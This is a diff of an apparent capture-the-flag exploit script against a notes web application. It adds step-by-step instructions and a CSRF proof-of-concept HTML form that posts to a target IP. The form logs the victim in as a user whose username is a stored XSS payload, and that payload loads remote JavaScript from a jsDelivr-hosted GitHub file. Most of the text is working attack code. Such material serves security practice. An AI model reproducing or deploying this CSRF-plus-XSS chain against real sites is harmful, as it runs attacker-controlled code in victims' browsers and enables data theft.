@@ -15,18 +15,30 @@ if (window.location.hash == '#child') {
   window.open('/#child');
 
   // Go back to previous note page
-  sleep(300).then(() => {
+  sleep(100).then(() => {
     window.history.back();
   });
 };
 
 /*
+Instructions:
+
+go to requestrepo.com
+In the response tab, upload the CSRF poc below as the response
+
+Then, before you can trigger it you need to create the malicious user (with password = password): 
+</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@f71332b1fd7b27614ca5050045a86ef9208eeb55/uh.js'></script>
+
+Then (for testing purposes) create new innocuous username, save a flag note, then visit the requestrepo.com domain you've hosted. MAKE SURE TO USE HTTP e.g. http://test.requestrepo.com.
+
+CSRF POC:
+
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="http://web:3000/login" method="POST" id="csrf">
-      <input type="hidden" name="username" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@5af60e86f45bb4ae34a0c140518a6dfe0e9b94a6/uh.js'></script>">
-      <input type="hidden" name="password" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@5af60e86f45bb4ae34a0c140518a6dfe0e9b94a6/uh.js'></script>">
+    <form action="http://65.21.3.129:10102/login" method="POST" id="csrf">
+      <input type="hidden" name="username" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@f71332b1fd7b27614ca5050045a86ef9208eeb55/uh.js'></script>">
+      <input type="hidden" name="password" value="password">
     </form>
     <script>
       document.getElementById("csrf").submit();
